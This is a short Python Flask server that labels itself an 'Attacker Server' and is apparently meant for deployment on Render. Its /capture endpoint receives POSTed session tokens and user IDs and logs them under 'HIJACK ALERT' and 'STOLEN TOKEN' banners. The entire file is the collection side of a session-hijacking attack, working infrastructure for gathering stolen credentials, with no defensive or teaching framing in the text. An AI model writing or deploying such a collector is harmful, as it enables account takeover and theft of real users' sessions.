import os
from flask import Flask, request, jsonify
import datetime

app = Flask(__name__)

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    token = data.get('session_token')
    user = data.get('user_id')
    
    print("\n" + "="*40)
    print("[!!!] HIJACK ALERT: DATA RECEIVED [!!!]")
    print(f"TIME: {datetime.datetime.now()}")
    print(f"TARGET: {user}")
    print(f"STOLEN TOKEN: {token}")
    print("="*40 + "\n")
    
    return jsonify({"status": "success"}), 200

@app.route('/')
def home():
    return "Attacker Server is Online."

if __name__ == '__main__':
    # Render assigns a port via environment variables
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
